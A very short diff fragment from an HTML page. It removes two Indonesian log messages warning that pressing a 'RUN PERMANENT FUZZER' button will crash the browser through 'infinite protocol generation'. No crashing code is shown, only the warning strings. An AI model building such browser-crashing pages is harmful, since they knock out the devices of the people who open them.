-addLog("⚠️ KLIK 'RUN PERMANENT FUZZER' - BROWSER AKAN CRASH", "crash");
-addLog("💀 TANPA SPAM WINDOW - MURNI INFINITE PROTOCOL GENERATION", "crash");
 </script>
 </body>
 </html>
